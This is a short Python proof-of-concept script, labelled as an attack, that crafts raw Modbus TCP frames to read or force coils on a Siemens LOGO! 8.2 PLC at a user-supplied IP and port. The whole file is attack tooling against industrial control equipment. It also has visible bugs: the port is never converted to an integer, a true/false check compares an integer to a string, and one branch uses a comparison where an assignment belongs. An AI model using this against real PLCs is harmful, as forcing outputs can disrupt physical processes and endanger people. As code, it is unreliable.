#!/usr/bin/python

"""
ATTACK PROOF-OF-CONCEPT CODE UNSANCTIONED USE FORBIDDEN!

Modbus attack aginst Siemens LOGO! 8.2.

Tested against PLC LOGO! 8.2 (1.82.0):
  1. PLC has to be with Modbus enabled

Resources:
  1. Modbus official documentation: https://modbus.org/tech.php
"""


import socket
import time
import sys

#define function codes (FC)

fc = [
	b'\x01', # Read coil  [1] -> 0
	b'\x03', # Read holding registers
	b'\x04', # Read input registers
	b'\x05', # Force single coil  [2] -> 3
	b'\x0F'  # Force multiple coils
]

print('Chose what to do:')
print('1. Read coil')
print('2. Force single coil')
print(' ')

item = int(input('Chose option: '))
print(' ')

target_ip = input('Enter target IP: ')
print(' ')

target_port = input('Enter target port: ')
print(' ')

static_header = b'\x00\x3c\x00\x00\x00'

def inject (ip, port, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect ((ip, port))

		s.send(payload)

		res = s.recv(900) # buffer

		print(res)

		s.close()

	except:
		print('TCP Connection on port '+ str(port) +' refused')
		print(' ')
		return 0
	return res

def calculate_data_length (payload):
	
	return bytes([len(payload)]) + b'\x01'


if item == 1:
	address = int(input('Address to read in decimal: '))
	print(' ')
	inject(target_ip, target_port, static_header + calculate_data_length(fc[0] + bytes([0, address])) + fc[0] + bytes([0, address]) )
elif item == 2:
	address = int(input('Address to read in decimal: '))
	print(' ')
	state = int(input('Set address to true or false?: '))
	print(' ')

	if state == 'true':
		state = b'\xFF\x00'
	else: 
		state == b'\x00\x00'

	inject(target_ip, target_port, static_header + calculate_data_length(fc[3] + bytes([0, address]) + state) + fc[3] + bytes([0, address]) + state )
else:
	print('No such option! Exiting')
	print(' ')




